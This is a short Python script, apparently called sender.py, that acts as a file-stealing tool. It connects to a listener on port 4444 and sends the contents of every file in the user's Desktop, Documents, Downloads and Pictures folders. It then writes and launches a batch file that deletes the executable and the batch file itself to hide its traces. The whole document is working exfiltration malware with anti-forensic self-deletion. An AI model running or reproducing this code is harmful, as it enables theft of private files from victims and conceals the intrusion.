import os
import socket
import time
import sys

server = "192.168.1.8"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("waiting receiver...")

while True:
    try:
        s.connect((server,port))
        print("connected!")
        break
    except socket.error:
        time.sleep(2)

user_profile = os.environ['userprofile']
paths = [
    os.path.join(user_profile,'Desktop'),
    os.path.join(user_profile,'Documents'),
    os.path.join(user_profile,'Downloads'),
    os.path.join(user_profile,'Pictures')
]

for sender in paths:
    for root, dirs, files in os.walk(sender):
        for i in files:
            file_dir = os.path.join(root,i)

            if "sender.py" in file_dir:
                continue

            try:
                with open(file_dir, "rb") as f:
                    content = f.read()

                print(f"Sending: {i}")
                s.sendall(f"{i}\n".encode())
                s.sendall(content)
                s.sendall(b"\n---end---\n")

            except Exception as e:
                print(f"error: {i}: {e}. jumping...")
                continue

s.close()
print("done!")


# creating the bat file to destroy everything
script_dir = os.path.abspath('')

bat_file_path = os.path.join(script_dir, 'hoe.bat')
del_file_path = os.path.join(script_dir, os.path.basename(sys.executable))

try:
    with open(bat_file_path, 'w') as f:
        f.write('@echo off\n')
        f.write('timeout /t 2 >nul\n')
        f.write(f'del /f /q "{del_file_path}"\n')
        f.write(f'del /f /q "{bat_file_path}"\n')

    os.system(f'start /min cmd /c {bat_file_path}')
    sys.exit()

except:
    pass
